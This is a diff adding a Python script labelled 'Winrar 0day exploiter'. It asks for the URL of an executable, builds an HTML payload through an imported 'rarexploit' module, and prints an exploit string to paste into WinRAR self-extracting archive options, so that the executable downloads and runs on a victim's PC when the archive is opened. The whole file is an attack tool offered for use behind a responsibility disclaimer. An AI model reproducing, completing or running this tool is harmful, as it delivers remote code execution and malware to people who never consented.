@@ -1,0 +1,66 @@
+#!/usr/bin/python
+#Coded by 3Turr
+#Coded in python 3.5
+
+import time
+import socks
+import os
+import socket
+import signal
+import sys
+import rarexploit
+
+if sys.version_info > (2,7,0):
+  raw_input = input
+
+def cls():
+	if (os.name == "nt"):
+		os.system('cls')
+	else:
+		os.system('clear')
+
+cls()
+
+try:
+	print("""[+]   Winrar 0day exploiter   [+]
+The coder is not responsible of
+the use of this code. use it at 
+your own risk!
+""")
+	attack_prem = raw_input("[+]Do you Agree?: ")
+	if (attack_prem != "N" and (attack_prem == "Y" or attack_prem == "y")):
+		attack_prem = 1
+		cls()
+		print("[+] info: ")
+		print("This option allows you to download an exe file from a direct URL and run it in the victem PC.")
+		print("1.Insert the exe URL, Than a HTML file will be made.")
+		print("2.Upload the html file into any WebServer (public or local).")
+		print("3.Copy the exploit code into the winrar SFX file.")
+		print("4.Wait for the vitem to open the file.")
+		print("[+] URL kinds (http, https, ftp)")
+		exehost = raw_input("[+] EXE URL: ")
+		
+		if exehost[0:7] == 'http://' or exehost[0:8] == 'https://' or exehost[0:6] == 'ftp://':
+			cls()
+			out = time.strftime("%H-%M-%S", time.gmtime())+".html"
+			htmloutpt = open(out, 'a')
+			out2 = rarexploit.gexploit1(exehost)
+			htmloutpt.write(out2)
+			htmloutpt.close()
+			print("[+] Payload code had been generated!")
+			print("[!] Payload file: "+out)
+			print("[+] Tipe:\r\nPlease upload the file into a local/public webserver and put its direct URL here.")
+			time.sleep(5)
+			host = raw_input("[+] Payload URL: ")
+			if host[0:7] == 'http://' or host[0:8] == 'https://' or host[0:6] == 'ftp://':
+				sfxinject = rarexploit.gexploit2(host)
+				print("[+] Done, Please copy the following exploit code and past it into the winrar SFX options.")
+				print("EXPLOIT:\r\n"+sfxinject+"\r\n")
+			else:
+				print("[ERROR]: The URL is not valid!")
+		else:
+			print("[ERROR]: The URL is not valid!")
+			exit(0)	
+except (KeyboardInterrupt, EOFError):
+	print("\r\n\r\nScript Interrupted, bye!\r\n")
+	os.exit
